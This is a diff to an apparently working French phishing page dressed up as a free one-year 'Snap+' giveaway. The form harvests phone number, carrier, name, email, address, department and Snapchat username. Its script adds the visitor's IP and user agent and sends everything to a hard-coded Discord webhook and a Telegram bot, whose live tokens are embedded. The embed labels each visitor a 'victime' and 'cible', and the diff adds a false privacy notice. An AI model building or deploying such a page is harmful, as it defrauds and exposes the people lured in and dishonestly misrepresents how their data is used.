@@ -14,15 +14,16 @@
       display: flex;
       justify-content: center;
       align-items: center;
-      text-align: center;
     }
     .container {
       background: rgba(44, 1, 77, 0.85);
       border: 2px solid #a54ffb;
       border-radius: 20px;
       padding: 30px 25px;
+      text-align: center;
       width: 340px;
       box-shadow: 0 0 20px #a54ffb;
+      position: relative;
       animation: pulseBorder 2s infinite;
     }
     @keyframes pulseBorder {
@@ -30,45 +31,91 @@
       50% { box-shadow: 0 0 25px #a54ffb; }
       100% { box-shadow: 0 0 10px #a54ffb; }
     }
-    input, select, button {
+    .logo {
+      font-size: 70px;
+      margin-bottom: 5px;
+      text-shadow: 0 0 10px #fff;
+    }
+    h1 {
+      font-size: 24px;
+      margin: 0 0 15px;
+      letter-spacing: 1px;
+    }
+    p {
+      font-size: 15px;
+      color: #ddd;
+      margin-bottom: 25px;
+    }
+    input, select {
       width: 100%;
       padding: 12px;
       margin: 8px 0;
       border: 2px solid #a54ffb;
       border-radius: 10px;
-      background: transparent;
+      background-color: transparent;
       color: white;
       font-size: 15px;
+      outline: none;
+    }
+    input::placeholder, select {
+      color: #ccc;
     }
     button {
+      width: 100%;
       background: #a54ffb;
+      border: none;
+      border-radius: 10px;
+      color: white;
+      padding: 12px;
+      font-size: 16px;
       font-weight: bold;
       cursor: pointer;
+      margin-top: 12px;
       box-shadow: 0 0 10px #a54ffb;
+      transition: 0.3s;
     }
     button:hover {
       background: #8b3ddb;
       box-shadow: 0 0 20px #c177ff;
     }
-    .logo { font-size: 60px; }
-    .notice { font-size: 12px; color: #bbb; margin-top: 10px; }
-    #step2 { display: none; }
-    #blocked { display: none; color: #f66; font-size: 18px; }
+    .notice {
+      font-size: 12px;
+      margin-top: 15px;
+      color: #bbb;
+    }
+    #step2 {
+      display: none;
+    }
   </style>
 </head>
 <body>
-  <div class="container" id="mainContainer">
+  <div class="container">
     <div class="logo">👻✨</div>
     <h1>Snap+ Gratuit</h1>
     <p>Active 1 an de Snap+ gratuitement</p>
 
     <form id="giveawayForm">
       <div id="step1">
-        <input type="text" name="telephone" placeholder="Numéro de téléphone" required pattern="[\d\s+]{6,}" />
+        <input
+          type="text"
+          name="telephone"
+          placeholder="Numéro de téléphone"
+          required
+          pattern="[\d\s+]{6,}"
+          title="Entrez un numéro valide"
+        />
         <button type="button" onclick="showStep2()">Continuer</button>
       </div>
 
       <div id="step2">
+        <select name="operateur" required>
+          <option value="" disabled selected>Opérateur téléphonique</option>
+          <option value="Orange">Orange</option>
+          <option value="SFR">SFR</option>
+          <option value="Bouygues">Bouygues</option>
+          <option value="Free">Free</option>
+          <option value="Autre">Autre</option>
+        </select>
         <input type="text" name="nom" placeholder="Nom" required />
         <input type="text" name="prenom" placeholder="Prénom" required />
         <input type="email" name="email" placeholder="Email" required />
@@ -76,76 +123,93 @@
         <input type="text" name="departement" placeholder="Département" required />
         <input type="text" name="adresse" placeholder="Adresse (facultatif)" />
         <input type="text" name="snap" placeholder="Nom d'utilisateur Snapchat" required />
-        <select name="operateur" required>
-          <option value="">Sélectionnez votre opérateur</option>
-          <option value="Orange">Orange</option>
-          <option value="SFR">SFR</option>
-          <option value="Bouygues">Bouygues</option>
-          <option value="Free">Free</option>
-          <option value="NRJ Mobile">NRJ Mobile</option>
-          <option value="La Poste Mobile">La Poste Mobile</option>
-          <option value="Autre">Autre</option>
-        </select>
         <button type="submit">Valider</button>
       </div>
     </form>
-    <div class="notice">Concours non affilié à Snapchat.</div>
-  </div>
 
-  <div id="blocked">
-    ❌ Accès refusé : votre IP est blacklistée.
+    <div class="notice">
+      Les données sont utilisées uniquement pour vous contacter si vous gagnez. Ce concours
+      n’est pas affilié à Snapchat.
+    </div>
   </div>
 
   <script>
-    const BLACKLISTED_IPS = ["81.185.167.149", "111.222.333.444"];
     const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1399083560782270485/HQzCh3RmPUzWhOrfR-5dOQ_vX78AtG0eTeRjAih95uNq3lkCtQcLirMMwOufmBB1Zs0u";
+
+    // Telegram constants (remis comme dans ton code d’origine)
     const TELEGRAM_TOKEN = "7949221639:AAFENIkH1WqC2m6oVP8_aPOnsT6Qk9tBN2E";
-    const TELEGRAM_CHAT_ID = "-1001234567890";
+    const TELEGRAM_CHAT_ID = "-1002810249796";
 
-    async function getIP() {
-      try {
-        const res = await fetch("https://api.ipify.org?format=json");
-        const { ip } = await res.json();
-        return ip;
-      } catch {
-        return "IP inconnue";
-      }
-    }
+    const SUBMISSION_LIMIT = 2;
+    const TIME_WINDOW_MINUTES = 30;
 
-    async function showStep2() {
-      const ip = await getIP();
-      if (BLACKLISTED_IPS.includes(ip)) {
-        document.getElementById("mainContainer").style.display = "none";
-        document.getElementById("blocked").style.display = "block";
+    function showStep2() {
+      const phoneInput = document.querySelector('[name="telephone"]');
+      if (!phoneInput.value.trim()) {
+        alert("Veuillez entrer votre numéro de téléphone.");
         return;
       }
       document.getElementById("step1").style.display = "none";
       document.getElementById("step2").style.display = "block";
     }
 
+    async function getPublicIP() {
+      try {
+        const res = await fetch("https://api.ipify.org?format=json");
+        const data = await res.json();
+        return data.ip || "IP inconnue";
+      } catch {
+        return "IP inconnue";
+      }
+    }
+
+    function canSubmit() {
+      const now = Date.now();
+      const submissions = JSON.parse(localStorage.getItem("giveaway_submissions") || "[]");
+      const recent = submissions.filter(ts => now - ts < TIME_WINDOW_MINUTES * 60 * 1000);
+      if (recent.length >= SUBMISSION_LIMIT) return false;
+      recent.push(now);
+      localStorage.setItem("giveaway_submissions", JSON.stringify(recent));
+      return true;
+    }
+
     async function sendToTelegram(message) {
+      const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
       const payload = {
         chat_id: TELEGRAM_CHAT_ID,
         text: message,
         parse_mode: "Markdown",
-        disable_web_page_preview: true,
+        disable_web_page_preview: true
       };
-      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(payload),
-      });
+
+      try {
+        const res = await fetch(url, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
+        if (!res.ok) throw new Error("Erreur lors de l'envoi Telegram");
+      } catch (err) {
+        console.error("Telegram error:", err);
+      }
     }
 
     document.getElementById("giveawayForm").addEventListener("submit", async function (e) {
       e.preventDefault();
-      const form = new FormData(this);
-      const ip = await getIP();
-      const userAgent = navigator.userAgent;
 
-            const embed = {
+      if (!canSubmit()) {
+        alert(`Vous avez dépassé la limite de ${SUBMISSION_LIMIT} participations toutes les ${TIME_WINDOW_MINUTES} minutes.`);
+        return;
+      }
+
+      const data = new FormData(this);
+      const ip = await getPublicIP();
+      const userAgent = navigator.userAgent || "Inconnu";
+
+      // Embed Discord stylé "scammer vibes"
+      const embed = {
         title: "🎉🔥 **NOUVELLE VICTIME SNAP+** 🔥🎉",
-        description: "**💥 Snap+ gratuit 1 an activé ! 💥**\n\n**Détails de la cible :**",
+        description: "**Détails de la cible :**",
         color: 0x9B00FF,
         thumbnail: {
           url: "https://i.imgur.com/3nXvH0W.png"
@@ -166,7 +230,7 @@
           text: `Reçu le ${new Date().toLocaleString("fr-FR")}`
         },
         timestamp: new Date().toISOString(),
-      }:
+      };
 
       // Telegram message (version originale)
       const telegramMessage = `
@@ -195,15 +259,28 @@
 🕒 Reçu le : ${new Date().toLocaleString("fr-FR")}
 `;
 
-      await fetch(DISCORD_WEBHOOK_URL, {
+      // Envoi Discord
+      const discordSend = fetch(DISCORD_WEBHOOK_URL, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ embeds: [embed] }),
+      })
+      .then(res => {
+        if (!res.ok) throw new Error("Erreur lors de l'envoi Discord");
       });
 
-      await sendToTelegram(telegramMessage);
+      // Envoi Telegram
+      const telegramSend = sendToTelegram(telegramMessage);
 
-      window.location.href = "merci.html";
+      // Attendre les deux envois
+      Promise.all([discordSend, telegramSend])
+        .then(() => {
+          window.location.href = "merci.html";
+        })
+        .catch((err) => {
+          alert("Erreur lors de l’envoi. Réessayez.");
+          console.error(err);
+        });
     });
   </script>
 </body>
